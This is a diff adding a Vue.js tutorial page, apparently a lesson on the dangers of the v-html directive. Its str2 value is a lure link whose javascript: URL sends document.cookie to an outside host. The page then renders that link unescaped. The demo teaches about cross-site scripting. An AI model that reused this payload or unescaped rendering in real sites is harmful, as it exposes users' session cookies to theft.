@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>慎用</title>
+    <!-- 引入Vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+    <!-- 还有几个没写 v-once v-pre -->
+</head>
+<body>
+   
+<div id="root">
+      <div> hello ,{{name}}</div>
+      <div v-html="str"></div>
+      <div v-html="str2"></div>
+    </div>
+<script type="text/javascript">
+    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
+    const vm = new Vue({
+        el: '#root',
+        data: {
+          name:"safoti",
+          str:'<h3>你好啊！</h3>',
+          str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+        }
+      
+    })
+</script>
+</body>
+</html>
